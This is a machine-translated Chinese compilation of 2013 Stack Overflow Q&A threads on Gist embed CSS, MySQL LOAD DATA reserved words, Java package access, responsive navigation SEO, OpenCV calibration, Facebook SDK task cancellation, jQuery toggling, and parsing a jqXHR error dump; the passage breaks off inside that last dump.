**这是完全像这样序列化JSON**的最佳方法 ：

```
{"client_email":"kalvinmoraes@gmail.com","client_name":"Alexandre Moraes"} 
```

至

```
%7B%22client_email%22%3A%22kalvinmoraes%40gmail.com%22%2C%22client_name%22%3A%22Alexandre%20Moraes%22%7D 
```*********

# css - 嵌入式 Gist 有额外的换行符

> ID：15772691
> 
> 赞同：9
> 
> 时间：2013-04-02T19:29:09.577
> 
> 标签：css, twitter-bootstrap, gist

我在我的博客中嵌入了一个 github gist，生成的代码在顶部和底部有一些额外的换行符，我想删除它们。我的博客使用来自 bootstrap 项目的 css，它还调整了字体：

```
body {
    font: 100%/1.5 sans-serif;
} 
```

我[创建了这个小提琴](http://jsfiddle.net/W25px/3/)作为问题的演示。

摆脱休息的最佳方法是什么？我应该为嵌入式 gist 的字体设置样式吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T14:29:59.487

发生这种情况是因为`line-height`行号和代码行不同。这是因为您对行号（您的字体大小）和行代码（引导程序覆盖和for和元素）使用相对`line-height`（取决于字体大小）和不同的字体大小。要解决此问题，您可以重置 github gists 的引导样式：`font-size``line-height``pre``code`

**升级版：**

```
.gist pre,
.gist code {
  font: inherit;
  white-space: pre;
} 
```

证明：http: [//jsfiddle.net/W25px/8/](http://jsfiddle.net/W25px/8/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T17:52:41.633

除了必须重置字体的 Sody 回答之外，您还必须更改`white-space`属性行为以对齐代码和数字行。

和：

```
.gist pre,
.gist code {
    font: inherit;
    white-space: pre;
} 
```

您的要点应该完美显示：[JsFiddle](http://jsfiddle.net/vhTUC/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-19T04:56:46.293

在正文选择器之前添加此样式`* {line-height: normal;}`

看到这个**[小提琴](http://jsfiddle.net/W25px/7/)**

你也可以`line-height: 100%`比正常使用（你会注意到一点不同）

正如在另一个答案中提到的那样，您也可以在里面使用 line-height

```
.gist pre,
.gist code {
    line-height: 100%;
} 
```

如果这也不能解决您的问题，则可能已设置边距或填充值。修改那个`margin: 0; padding: 0;`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-14T21:42:01.300

我不确定这是否是您正在寻找的。

请看看这个**[jsFiddle](http://jsfiddle.net/Mee3/7C59m/)**

```
 /* Your Css */
     body {
           font: 100%/1.35 sans-serif;
     } 
```

我明白你的意思了吗？顶部和底部的多余线条？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-20T02:54:07.893

似乎 github gist 嵌入脚本以一种有趣的方式误解了 1.5 行高。

```
<div class="gist">
    <script src="https://gist.github.com/yosemitebandit/5295069.js?file=train.py">
    </script>
</div>

.gist {
    font:100%/1 sans-serif;
} 
```

似乎是一个简单的修复。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-13T02:58:55.527

我想通了，它是行高。您需要确保代码列表行号的行高与代码本身的行高匹配。

# php - PHP/Mysql 加载数据本地 Infile

> ID：15772692
> 
> 赞同：0
> 
> 时间：2013-04-02T19:29:12.067
> 
> 标签：php, mysql, csv

我已经尝试了我能想到的一切，但由于某种原因，我无法让它发挥作用。

我有一段 PHP 代码将本地存储的 CSV 文件加载到 MySQL 数据库中。它在一个脚本中完美运行：

```
$query = 'LOAD DATA LOCAL INFILE \''.$arp_input.'\' INTO TABLE arp_import FIELDS TERMINATED BY \',\' OPTIONALLY ENCLOSED BY \'"\' LINES TERMINATED BY \'\r\n\' (not_used,account_number,check_serial,issue_date,amount,transaction_code,additional_text)'; 
```

但是，我需要在另一个脚本中执行相同的操作（加载 CSV），该脚本基本上执行相同的操作，但会生成不同的格式。这是查询：

```
$query = 'LOAD DATA LOCAL INFILE \''.$ap_input.'\' INTO TABLE ap_import FIELDS TERMINATED BY \',\' OPTIONALLY ENCLOSED BY \'"\' LINES TERMINATED BY \'\r\n\' (account_number,check,paiddate,amount)'; 
```

但是当我使用上面的查询运行第二个脚本时，我得到了这个错误：

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'check,paiddate,amount)' at line 1 
```

当我在第二个查询结束时取出字段列表时，它只从文件中导入一行，就是这样，即使我尝试了 \n 分隔符、\r 和 \r\n。

我已经尝试了我能想到的一切。这两个 PHP 脚本在同一台服务器上运行，它们都在访问同一个远程 MySQL 服务器。我在这里想念什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:32:16.117

根据 MySQL 文档，检查是保留字。

[http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:34:51.457

**`check`**是 MySQL ( [http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html](http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html) ) 中的保留字。您应该在 sql 语句中将其括在反引号 (`) 中：

# java - Java 是否提供了一种允许从层次结构中的包进行特殊访问的方法？

> ID：15772693
> 
> 赞同：2
> 
> 时间：2013-04-02T19:29:12.400
> 
> 标签：java, package, access-modifiers, class-hierarchy

Java包层次结构会影响类和变量的访问权限吗？

关于 Java 包：[http ://docs.oracle.com/javase/tutorial/java/javaOO/accesscontrol.html](http://docs.oracle.com/javase/tutorial/java/javaOO/accesscontrol.html)

请看一下这一行：

> ...第二列表示与该类位于同一包中的类（**无论其父母**身份如何）是否可以访问该成员。...

据我所知，`package com.google`是`package com.google.music`两个独立的包。他们完全没有联系。它们的区别就像 和 之间的区别`package com.google`一样`package com.yahoo`。

这是真的？

有没有办法，或者关键字（public、private、protected等），可以让关系`package com.google`更`package com.google.music`紧密？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:42:01.633

Java 语言规范[写道](http://docs.oracle.com/javase/specs/jls/se7/html/jls-7.html#jls-7.1)：

> 包的分层命名结构旨在方便以常规方式组织相关包，但除了禁止包具有与顶级类型相同的简单名称的子包（第 7.6 节）外，其本身没有任何意义在该包中声明。
> 
> *例如，一个名为oliver 的包与另一个名为oliver.twist 的包之间或名为evelyn.wood 和evelyn.waugh 的包之间没有特殊的访问关系。也就是说，名为 Oliver.twist 的包中的代码无法比任何其他包中的代码更好地访问包 Oliver 中声明的类型。*

也就是说，你如何嵌套你的包对程序的语义没有影响。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:32:35.637

不，没有这样的关键字。在java中有4个访问级别：

*   上市
*   受保护
*   私人的
*   默认（包访问，同一包中的其他类可以访问该属性）。

# navigation - html 中的 2 个版本的导航是否有 seo 惩罚？（取决于调用的媒体查询）

> ID：15772694
> 
> 赞同：1
> 
> 时间：2013-04-02T19:29:12.870
> 
> 标签：navigation, responsive-design, media-queries

我正在建立一个响应式网站。桌面版在页脚内的底部有导航。当媒体查询开始时，我希望我的导航变成顶部的下拉菜单。这需要不同的 html 设置，因此仅 css 无法正确移动它，因此仅媒体查询无济于事。

话虽如此，我将需要 html 中的 2 组导航链接。一种用于台式机，一种用于移动设备。一个人当然会得到“显示：无；” 基于当前的媒体查询。

谷歌对此有任何处罚吗？我的意思是几乎所有网站在相同的页面上都有多个链接到相同的 url，所以我不认为重复的内容，但源代码会在源代码中说 #na​​vigation_desktop 和 #navigation_mobile。

我希望我可以对两者使用相同的导航，但单独的 css 可以正确移动它。其简单的不同编码和 div 结构。对此有任何意见吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:40:18.373

我非常怀疑你会受到惩罚 - Googlebot 非常聪明。如果您担心 HTML5 规范中有一个[`<nav>`](http://www.w3.org/html/wg/drafts/html/master/sections.html#the-nav-element)元素可以与页面内容进行明确的语义区分。

w3 页面建议您仍然照常标记列表，例如：

```
<nav>
  <ul>
    <li><a href="#">link
    <li><a href="#">link ...
  </ul>
</nav> 
```

# opencv - OpenCV相机标定——工作原理的大致了解

> ID：15772696
> 
> 赞同：2
> 
> 时间：2013-04-02T19:29:25.010
> 
> 标签：opencv, camera-calibration

我正在根据[http://dsynflo.blogspot.de/2010/03/camera-calibration-using-opencv.html中的代码进行相机校准](http://dsynflo.blogspot.de/2010/03/camera-calibration-using-opencv.html)

这会生成一个固有矩阵和失真系数以及角点，在图像中显示它们，然后显示原始原始图像和未失真图像。

最后一点让我有点无奈：原始图像和未失真校正图像之间几乎没有区别。我会假设未失真的图像显示接近原始棋盘格的东西，这意味着不再有缩短的正方形，而是纯 90 度角和或多或少精确的正方形。取而代之的是，只能看到边际变化。那么：这是该博客的示例实现中的一个错误，是 OpenCV 中的一个小问题，还是预期的结果？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-02T19:59:18.693

undistort 仅校正阻止镜头成为完美针孔的特征（即光学失真）透视效果仍然出现在完美镜头中，因此不会被移除。

创建成像场景的平面视图（鸟瞰投影）是 opencv 功能的一部分，但需要更多步骤 - 您需要对象实际位置的 3D 模型。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T20:53:49.330

这是一个经常讨论的过程。我强烈推荐[这个](http://www.aishack.in/tutorials/calibrating-undistorting-with-opencv-in-c-oh-yeah/)教程，正如[这个](https://stackoverflow.com/questions/3597941/camera-calibration)线程中已经提到的。了解底层技术通常是发现错误以及为什么事情没有按预期工作的关键。看看一些教程，直到您熟悉这些概念并且一切都突然到位;）祝你好运！

# android - 如何取消 RequestAsyncTask Facebook SDK 3.0？

> ID：15772697
> 
> 赞同：1
> 
> 时间：2013-04-02T19:29:25.653
> 
> 标签：android, facebook, android-asynctask

我试图取消一个 RequestAsyncTask，当我调用方法取消时，后台线程不会停止，因为 isCancelled 方法永远不会被调用，我该怎么做？这是我的代码：

```
Request requestUpload = Request.newUploadPhotoRequest(session, imagen, requestCallback);
        Bundle params = requestUpload.getParameters();
        params.putString("name", "hi everyone");
        requestUpload.setParameters(params);
        rq = Request.executeBatchAsync(requestUpload);
        progressDialog = ProgressDialog.show(getActivity(), "", "Wait please...", true, true, new DialogInterface.OnCancelListener() {
            @Override
            public void onCancel(DialogInterface dialog) {
                if (rq != null) {
                    rq.cancel(true);                           
                }
            }
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T15:12:32.500

有几件事：

首先，我不确定您如何编译该代码，因为我希望 rq 必须是 final 才能在匿名 OnCancelListener 方法中被引用。当我在我的环境中复制它时，它当然必须这样做。

其次，我不确定你的意思

> 因为 isCancelled 方法永远不会被调用

调用此方法是为了确定任务是否被取消，而不是取消它。

第三，我编写了类似的代码（如下），它显示当使用后退按钮取消对话框时，对 isCancelled 的调用返回 true。

最后，编写的代码将无限期地显示您的进度对话框，而您（可能）希望在请求完成时将其关闭。一种方法是创建 RequestAsyncTask 的子类，并重写其 onPostExecute 方法以关闭 ProgressDialog。

```
Bundle postParams = new Bundle();
postParams.putString("name", "Name");
postParams.putString("message", "Message");
postParams.putString("picture", imageURL);

Request request = new Request(fbSession, "me/feed", postParams, HttpMethod.POST, postResponseCallback);
final FacebookPostTask task = new FacebookPostTask(request);
task.execute();

facebookPostProgressDialog = ProgressDialog.show(this, "", "Posting to Facebook...", true, true,
    new DialogInterface.OnCancelListener() {
      @Override
      public void onCancel(DialogInterface dialog) {
        if (task != null) {
          task.cancel(true);
          Log.d(MainActivity.TAG, "Task cancelled? " + task.isCancelled());
        }
      }
    }); 
```

RequestAsyncTask 的子类如下所示：

```
 private class FacebookPostTask extends RequestAsyncTask {

    public FacebookPostTask(Request... requests) {
      super(requests);
    }

    @Override
    protected void onPostExecute(List<Response> result) {
      super.onPostExecute(result);
      facebookPostProgressDialog.dismiss();
    }

  } 
```

可能有更简单的方法可以做到这一点。

请注意，即使我成功取消了任务，FB 帖子似乎也继续进行。这可能只是我取消的速度。

# jquery - onclick 在 jquery 中展开 div 并隐藏另一个 div

> ID：15772699
> 
> 赞同：0
> 
> 时间：2013-04-02T19:29:40.420
> 
> 标签：jquery

当onclick展开时我应该怎么做，当点击另一个时关闭另一个或者将是一个很长的页面

```
<script language="javascript">
var ie4 = false;
if(document.all) { ie4 = true; }

function getObject(id) { if (ie4) { return document.all[id]; } else { return document.getElementById(id); } }
function toggle(link, divId) {
    var d = getObject(divId);
    if (d.style.display == \'\') { d.style.display = \'none\'; }
    else { d.style.display = \'\'; }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:55:31.760

我没有完全理解你想要做什么，但也许[toggle() 函数](http://api.jquery.com/toggle/)可以帮助你。因为它的用途之一是打开一个封闭的对象（显示：无 --> 显示：块）并隐藏一个打开的对象（显示：块 --> 显示：无）

对象可以是例如 (div)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:58:17.423

假设你有一个如下的 HTML 结构：

```
<ul id="faqs">
    <li>
        <p class="heading">First FAQ question</p>
        <p>First FAQ answer</p>
    </li>
    <li>
        <p class="heading">Second FAQ question</p>
        <p>Second FAQ answer</p>
    </li>
    <li>
        <p class="heading">Third FAQ question</p>
        <p>Third FAQ answer</p>
    </li>
</ul> 
```

我会使用这样的东西（因为你把这个问题放在 jQuery 类别中）：

```
$(document).ready(function() {
    $('#faqs > li > p:last-child').hide();
    $('#faqs > li:first-child > p:last-child').show();
    $('#faqs > li').on('click', function() {
        $('#faqs > li > p:last-child').hide();
        $(this).children('p:last-child').show();
    });
}); 
```

**演示**：http: [//jsfiddle.net/TPPxP/12](http://jsfiddle.net/TPPxP/12)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:45:42.933

**编辑：**

我刚刚阅读了您的评论，我想我现在更好地理解了您的问题。我认为这就是你要找的：

**示例演示：http:** [//jsfiddle.net/mp2xn/1/](http://jsfiddle.net/mp2xn/1/)

```
<ul>
    <li class="q">Question One</li>
    <li>first answer to question one</li>
    <li>second answer to question one</li>
    <li class="q">Question two</li>
    <li>first answer to question two</li>
    <li>second answer to question two</li>
    <li class="q">Question three</li>
    <li>first answer to question three</li>
    <li>second answer to question three</li>
</ul> 
```

和jQuery代码：

```
$('li:not(".q")').hide();

$('li.q').click(
    function(){
        $('li:not(".q")').slideUp();
        $(this).nextUntil('.q').slideDown();
    }); 
```

# jquery - 你知道这是什么类型的代码以及如何用 jQuery 解析它吗？

> ID：15772701
> 
> 赞同：1
> 
> 时间：2013-04-02T19:29:42.240
> 
> 标签：jquery, post, error-handling

我正在使用 $.post jQuery 函数。成功部分没问题，但错误部分从操作 url 接收到一些代码，我不知道它到底是什么以及如何用 jQuery 解析它。

操作网址是“wp-comments-post.php”（WordPress 评论发布）。

让我说我试图用这些函数解析它但没有成功：jQuery.parseJSON() - jQuery.parseHTML()

这是我通过 console.log(error) 获得的代码：

```
({
    readyState: 4,
    getResponseHeader: (function (e) {
        var t;
        if (2 === x) {
            if (!c) {
                c = {};
                while (t = Tn.exec(a)) c[t[1].toLowerCase()] = t[2]
            }
            t = c[e.toLowerCase()]
        }
        return null == t ? null : t
    }),
    getAllResponseHeaders: (function () {
        return 2 === x ? a : null
    }),
    setRequestHeader: (function (e, t) {
        var n = e.toLowerCase();
        return x || (e = v[n] = v[n] || e, y[e] = t), this
    }),
    overrideMimeType: (function (e) {
        return x || (p.mimeType = e), this
    }),
    statusCode: (function (e) {
        var t;
        if (e) if (2 > x) for (t in e) m[t] = [m[t], e[t]];
        else N.always(e[N.status]);
        return this
    }),
    abort: (function (e) {
        var t = e || T;
        return l && l.abort(t), k(0, t), this
    }),
    state: (function () {
        return n
    }),
    always: (function () {
        return i.done(arguments).fail(arguments), this
    }),
    then: (function () {
        var e = arguments;
        return b.Deferred(function (n) {
            b.each(t, function (t, o) {
                var a = o[0],
                    s = b.isFunction(e[t]) && e[t];
                i[o[1]](function () {
                    var e = s && s.apply(this, arguments);
                    e && b.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[a + "With"]
                    (this === r ? n.promise() : this, s ? [e] : arguments)
                })
            }), e = null
        }).promise()
    }),
    promise: (function (e) {
        return null != e ? b.extend(e, r) : r
    }),
    pipe: (function () {
        var e = arguments;
        return b.Deferred(function (n) {
            b.each(t, function (t, o) {
                var a = o[0],
                    s = b.isFunction(e[t]) && e[t];
                i[o[1]](function () {
                    var e = s && s.apply(this, arguments);
                    e && b.isFunction(e.promise) ? e.promise().done(n.resolve).fail(n.reject).progress(n.notify) : n[a + "With"]
                    (this === r ? n.promise() : this, s ? [e] : arguments)
                })
            }), e = null
        }).promise()
    }),
    done: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })
            (arguments), n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    fail: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })
            (arguments), n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    progress: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })
            (arguments), n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    complete: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })
            (arguments), n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    success: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })
            (arguments), n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    error: (function () {
        if (u) {
            var t = u.length;
            (function i(t) {
                b.each(t, function (t, n) {
                    var r = b.type(n);
                    "function" === r ? e.unique && p.has(n) || u.push(n) : n && n.length && "string" !== r && i(n)
                })
            })(arguments),
            n ? o = u.length : r && (s = t, c(r))
        }
        return this
    }),
    responseText: "<!DOCTYPE html>\n<!-- Ticket #11289, IE bug fix: always pad the error page with enough characters such 
that it is greater than 512 bytes, even after gzip compression abcdefghijklmnopqrstuvwxyz1234567890aabbccddeeffgghhii
jjkkllmmnnooppqqrrssttuuvvwwxxyyzz11223344556677889900abacbcbdcdcededfefegfgfhghgihihjijikjkjlklkmlmlnmnmononpopoqpqp
rqrqsrsrtstsubcbcdcdedefefgfabcadefbghicjkldmnoepqrfstugvwxhyz1i234j567k890laabmbccnddeoeffpgghqhiirjjksklltmmnunoovp
pqwqrrxsstytuuzvvw0wxx1yyz2z113223434455666777889890091abc2def3ghi4jkl5mno6pqr7stu8vwx9yz11aab2bcc3dd4ee5ff6gg7hh8ii9
j0jk1kl2lmm3nnoo4p5pq6qrr7ss8tt9uuvv0wwx1x2yyzz13aba4cbcb5dcdc6dedfef8egf9gfh0ghg1ihi2hji3jik4jkj5lkl6kml7mln8mnm9ono
\n-->\n<html xmlns=\"http://www.w3.org/1999/xhtml\" dir=\"rtl\" lang=\"fa-IR\">\n<head>\n\t<meta http-equiv=\"Content
-Type\" content=\"text/html; charset=utf-8\" />\n\t<title>\u0648\u0631\u062F\u067E\u0631\u0633 &rsaquo; \u062E\u0637\
u0627</title>\n\t<style type=\"text/css\">\n\t\thtml {\n\t\t\tbackground: #f9f9f9;\n\t\t}\n\t\tbody {\n\t\t\tbackgrou
nd: #fff;\n\t\t\tcolor: #333;\n\t\t\tfont-family: sans-serif;\n\t\t\tmargin: 2em auto;\n\t\t\tpadding: 1em 2em;\n\t\t
\t-webkit-border-radius: 3px;\n\t\t\tborder-radius: 3px;\n\t\t\tborder: 1px solid #dfdfdf;\n\t\t\tmax-width: 700px;\n
\t\t}\n\t\th1 {\n\t\t\tborder-bottom: 1px solid #dadada;\n\t\t\tclear: both;\n\t\t\tcolor: #666;\n\t\t\tfont: 24px Ge
orgia, \"Times New Roman\", Times, serif;\n\t\t\tmargin: 30px 0 0 0;\n\t\t\tpadding: 0;\n\t\t\tpadding-bottom: 7px;\n
\t\t}\n\t\t#error-page {\n\t\t\tmargin-top: 50px;\n\t\t}\n\t\t#error-page p {\n\t\t\tfont-size: 14px;\n\t\t\tline-hei
ght: 1.5;\n\t\t\tmargin: 25px 0 20px;\n\t\t}\n\t\t#error-page code {\n\t\t\tfont-family: Consolas, Monaco, monospace;
\n\t\t}\n\t\tul li {\n\t\t\tmargin-bottom: 10px;\n\t\t\tfont-size: 14px ;\n\t\t}\n\t\ta {\n\t\t\tcolor: #21759B;\n\t\
t\ttext-decoration: none;\n\t\t}\n\t\ta:hover {\n\t\t\tcolor: #D54E21;\n\t\t}\n\t\t.button {\n\t\t\tdisplay: inline-b
lock;\n\t\t\ttext-decoration: none;\n\t\t\tfont-size: 14px;\n\t\t\tline-height: 23px;\n\t\t\theight: 24px;\n\t\t\tmar
gin: 0;\n\t\t\tpadding: 0 10px 1px;\n\t\t\tcursor: pointer;\n\t\t\tborder-width: 1px;\n\t\t\tborder-style: solid;\n\t
\t\t-webkit-border-radius: 3px;\n\t\t\tborder-radius: 3px;\n\t\t\twhite-space: nowrap;\n\t\t\t-webkit-box-sizing: bor
der-box;\n\t\t\t-moz-box-sizing:    border-box;\n\t\t\tbox-sizing:         border-box;\n\t\t\tbackground: #f3f3f3;\n\
t\t\tbackground-image: -webkit-gradient(linear, left top, left bottom, from(#fefefe), to(#f4f4f4));\n\t\t\tbackground
-image: -webkit-linear-gradient(top, #fefefe, #f4f4f4);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #fefefe
, #f4f4f4);\n\t\t\tbackground-image:      -o-linear-gradient(top, #fefefe, #f4f4f4);\n\t\t\tbackground-image:   linea
r-gradient(to bottom, #fefefe, #f4f4f4);\n\t\t\tborder-color: #bbb;\n\t\t \tcolor: #333;\n\t\t\ttext-shadow: 0 1px 0\t}
\n\n\t\t.button:hover,\n\t\t.button:focus {\n\t\t\tbackground: #f3f3f3;\n\t\t\tbackground-image: -webkit-gradient
(linear, left top, left bottom, from(#fff), to(#f3f3f3));\n\t\t\tbackground-image: -webkit-linear-gradient(top, #fff,
 #f3f3f3);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #fff, #f3f3f3);\n\t\t\tbackground-image:    
 -ms-linear-gradient(top, #fff, #f3f3f3);\n\t\t\tbackground-image:      -o-linear-gradient(top, #fff, #f3f3f3);
 \n\t\t\tbackground-image:   linear-gradient(to bottom, #fff, #f3f3f3);\n\t\t\tborder-color: #999;\n\t\t\tcolor: #222;
 \n\t\t}\n\n\t\t.button:focus  {\n\t\t\t-webkit-box-shadow: 1px 1px 1px rgba(0,0,0,.2);
 \n\t\t\tbox-shadow: 1px 1px 1px rgba(0,0,0,.2);\n\t\t}\n\n\t\t.button:active {\n\t\t\toutline: none;
 \n\t\t\tbackground: #eee;\n\t\t\tbackground-image: -webkit-gradient(linear, left top, 
 left bottom, from(#f4f4f4), to(#fefefe));\n\t\t\tbackground-image: -webkit-linear-gradient(top, 
 #f4f4f4, #fefefe);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:     -ms-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:      -o-linear-gradient(top, #f4f4f4, #fefefe);
 \n\t\t\tbackground-image:   linear-gradient(to bottom, #f4f4f4, #fefefe);
 \n\t\t\tborder-color: #999;\n\t\t\tcolor: #333;\n\t\t\ttext-shadow: 0 -1px 0 #fff;
 \n\t\t\t-webkit-box-shadow: inset 0 2px 5px -3px rgba( 0, 0, 0, 0.5 );
 \n\t\t \tbox-shadow: inset 0 2px 5px -3px rgba( 0, 0, 0, 0.5 );\n\t\t}\n\n\t\t\t\tbody { font-family: Tahoma, Arial; }
 \n\t\t\t</style>\n</head>\n<body id=\"error-page\">\n\t<p>\u062F\u06CC\u062F\u06AF\u0627\u0647 \u062A\u06A
9\u0631\u0627\u0631\u06CC \u0634\u0646\u0627\u0633\u0627\u06CC\u06CC \u0634\u062F\u061B \u0634\u0645\u0627 
\u067E\u06CC\u0634 \u0627\u0632 \u0627\u06CC\u0646 \u0647\u0645 \u0686\u0646\u06CC\u0646 \u0686\u06CC\u0632\u06CC 
\u06AF\u0641\u062A\u0647 \u0628\u0648\u062F\u06CC\u062F!</p></body>\n</html>\n",
    status: 500,
    statusText: "Internal Server Error"
}) 
```

我知道这是错误 500（“内部服务器错误”）。我只是想知道我是否可以解析代码或至少在其中获取 html 代码。如果您仔细查看代码，您可以看到 html 部分：

```
responseText: "<!DOCTYPE html>\n<!-- Ticket #11289, IE bug fix: always pad the error page with enough characters such 
that it is greater than 512 bytes, even after gzip compression abcdefghijklmnopqrstuvwxyz1234567890aabbccddeeffgghhii
jjkkllmmnnooppqqrrssttuuvvwwxxyyzz11223344556677889900abacbcbdcdcededfefegfgfhghgihihjijikjkjlklkmlmlnmnmononpopoqpqp
rqrqsrsrtstsubcbcdcdedefefgfabcadefbghicjkldmnoepqrfstugvwxhyz1i234j567k890laabmbccnddeoeffpgghqhiirjjksklltmmnunoovp
pqwqrrxsstytuuzvvw0wxx1yyz2z113223434455666777889890091abc2def3ghi4jkl5mno6pqr7stu8vwx9yz11aab2bcc3dd4ee5ff6gg7hh8ii9
j0jk1kl2lmm3nnoo4p5pq6qrr7ss8tt9uuvv0wwx1x2yyzz13aba4cbcb5dcdc6dedfef8egf9gfh0ghg1ihi2hji3jik4jkj5lkl6kml7mln8mnm9ono
\n-->\n<html xmlns=\"http://www.w3.org/1999/xhtml\" dir=\"rtl\" lang=\"fa-IR\">\n<head>\n\t<meta http-equiv=\"Content
-Type\" content=\"text/html; charset=utf-8\" />\n\t<title>\u0648\u0631\u062F\u067E\u0631\u0633 &rsaquo; \u062E\u0637\
u0627</title>\n\t<style type=\"text/css\">\n\t\thtml {\n\t\t\tbackground: #f9f9f9;\n\t\t}\n\t\tbody {\n\t\t\tbackgrou
nd: #fff;\n\t\t\tcolor: #333;\n\t\t\tfont-family: sans-serif;\n\t\t\tmargin: 2em auto;\n\t\t\tpadding: 1em 2em;\n\t\t
\t-webkit-border-radius: 3px;\n\t\t\tborder-radius: 3px;\n\t\t\tborder: 1px solid #dfdfdf;\n\t\t\tmax-width: 700px;\n
\t\t}\n\t\th1 {\n\t\t\tborder-bottom: 1px solid #dadada;\n\t\t\tclear: both;\n\t\t\tcolor: #666;\n\t\t\tfont: 24px Ge
orgia, \"Times New Roman\", Times, serif;\n\t\t\tmargin: 30px 0 0 0;\n\t\t\tpadding: 0;\n\t\t\tpadding-bottom: 7px;\n
\t\t}\n\t\t#error-page {\n\t\t\tmargin-top: 50px;\n\t\t}\n\t\t#error-page p {\n\t\t\tfont-size: 14px;\n\t\t\tline-hei
ght: 1.5;\n\t\t\tmargin: 25px 0 20px;\n\t\t}\n\t\t#error-page code {\n\t\t\tfont-family: Consolas, Monaco, monospace;
\n\t\t}\n\t\tul li {\n\t\t\tmargin-bottom: 10px;\n\t\t\tfont-size: 14px ;\n\t\t}\n\t\ta {\n\t\t\tcolor: #21759B;\n\t\
t\ttext-decoration: none;\n\t\t}\n\t\ta:hover {\n\t\t\tcolor: #D54E21;\n\t\t}\n\t\t.button {\n\t\t\tdisplay: inline-b
lock;\n\t\t\ttext-decoration: none;\n\t\t\tfont-size: 14px;\n\t\t\tline-height: 23px;\n\t\t\theight: 24px;\n\t\t\tmar
gin: 0;\n\t\t\tpadding: 0 10px 1px;\n\t\t\tcursor: pointer;\n\t\t\tborder-width: 1px;\n\t\t\tborder-style: solid;\n\t
\t\t-webkit-border-radius: 3px;\n\t\t\tborder-radius: 3px;\n\t\t\twhite-space: nowrap;\n\t\t\t-webkit-box-sizing: bor
der-box;\n\t\t\t-moz-box-sizing:    border-box;\n\t\t\tbox-sizing:         border-box;\n\t\t\tbackground: #f3f3f3;\n\
t\t\tbackground-image: -webkit-gradient(linear, left top, left bottom, from(#fefefe), to(#f4f4f4));\n\t\t\tbackground
-image: -webkit-linear-gradient(top, #fefefe, #f4f4f4);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #fefefe
, #f4f4f4);\n\t\t\tbackground-image:      -o-linear-gradient(top, #fefefe, #f4f4f4);\n\t\t\tbackground-image:   linea
r-gradient(to bottom, #fefefe, #f4f4f4);\n\t\t\tborder-color: #bbb;\n\t\t \tcolor: #333;\n\t\t\ttext-shadow: 0 1px 0\t}
\n\n\t\t.button:hover,\n\t\t.button:focus {\n\t\t\tbackground: #f3f3f3;\n\t\t\tbackground-image: -webkit-gradient
(linear, left top, left bottom, from(#fff), to(#f3f3f3));\n\t\t\tbackground-image: -webkit-linear-gradient(top, #fff,
 #f3f3f3);\n\t\t\tbackground-image:    -moz-linear-gradient(top, #fff, #f3f3f3);\n\t\t\tbackground-image:    
 -ms-linear-gradient(top, #fff, #f3f3f3);\n\t\t\tbackground-image:      -o-linear-gradient(top, #fff, #f3f3f3);
 \n\t\t\tbackground-image:   linear-gradient(to bottom, #fff, #f3f3f3);\n\t\t\tborder-color: #999;\n\t\t\tcolor: #222;
 \n\t\t}\n\n\t\t.button:focus  {\n\t\t\t-webkit-box-shadow: 1px 1px 1px rgba(0,0,0,.2);
 \n\t\t\tbox-shadow: 1px 1px 1px rgba(0,0,0,.2);\n\t\t}\n\n\t\t.button:active {\n\t\t\toutline: none;
 \n\t\t\tbackground: #eee;\n\t\t\tbackground-image: -webkit-gradient(linear, left top, 
